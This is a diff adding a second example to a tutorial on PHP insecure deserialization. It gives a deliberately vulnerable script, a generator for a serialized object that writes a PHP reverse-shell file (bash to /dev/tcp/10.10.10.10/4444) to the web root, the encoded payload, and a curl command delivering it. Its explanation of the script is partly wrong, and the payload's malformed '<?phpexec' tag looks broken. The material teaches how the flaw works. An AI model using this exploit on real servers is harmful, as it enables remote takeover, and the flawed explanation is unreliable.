@@ -179,3 +179,76 @@ Passing the string above into the ```data``` cookie, the ```phpinfo();``` functi
 3. Because the ```data``` cookie is a serialized ```Example``` object, ```unserialize()``` instantiates a new ```Example``` object
 4. The magic method ```__wakeup()``` is available so at this point, it is called
 5. The ```$hook``` property of the object is checked for and if it is not NULL, it is executed through ```eval()```
+
+### Example 2: RCE through variable injection
+
+We have the following vulnerable server side script:
+
+```php
+<?php
+class DatabaseExport
+{
+        public $user_file = 'users.txt';
+        public $data = '';
+
+        public function update_db()
+        {
+                echo '[+] Grabbing users from text file';
+                $this-> data = 'Success';
+        }
+        public function __destruct()
+        {
+                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
+                echo '[] Database updated';
+        }
+}
+
+$input = $_GET['user_input'] ?? '';
+$databaseupdate = unserialize($input);
+$app = new DatabaseExport;
+$app -> update_db();
+?>
+```
+
+The script does the following:
+
+1. It takes the variable ```user_input``` as input and ```unserialize()``` is called on it
+2. If the input is a serialized ```DataBaseExport``` object, ```unserialize()``` instantiates a new ```DataBaseExport``` object
+3. The magic method ```__destruct()``` is available so it is called
+4. The ```__destruct()``` method puts the contents of the ```data``` variable on to a filename that is defined by the variable ```user_file```. The file is then copied to the root directory of the web server.
+5. Calls the ```update_db()``` method to update the file with the latest data in the ```data``` variable and copies the file to the root directory.
+
+To exploit this we can craft a ```user_input`` input as a serialized object that contains a reverse shell. This input is written as a file to the root directory of the webserver. We can then navigate to that file and execute it. The malicious input can be created as follows:
+
+```php
+<?php
+class DatabaseExport
+{
+    public $user_file='revsh.php';
+    public $data='<?phpexec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\'"); ?>';
+}
+print("serialized object:\n");
+print(serialize(new DatabaseExport));
+print("\n\n");
+print("serialized object with encoding:\n");
+print(urlencode(serialize(new DatabaseExport)));
+?>
+```
+
+As shown above, the ```data``` variable contains the reverse shell and the ```user_file``` variable contains the filename of the file that will be placed in the root directory of the server. The output of this snippet is as follows:
+
+```console
+serialized object:
+O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"revsh.php";s:4:"data";s:73:"<?phpexec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'"); ?>";}
+
+serialized object with encoding:
+O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22revsh.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphpexec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
+```
+
+Now we can pass the encoded string into the ```user_input``` variable as follows:
+
+```console
+kali@kali:~$ curl -i http://example.com/server.php?user_input=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22revsh.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphpexec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
+```
+
+This will write the file to the root of the server. The file that's copied (revsh.php) can now be executed simply by navigating to http://example.com/revsh.php and the reverse shell can be caught with a listener.
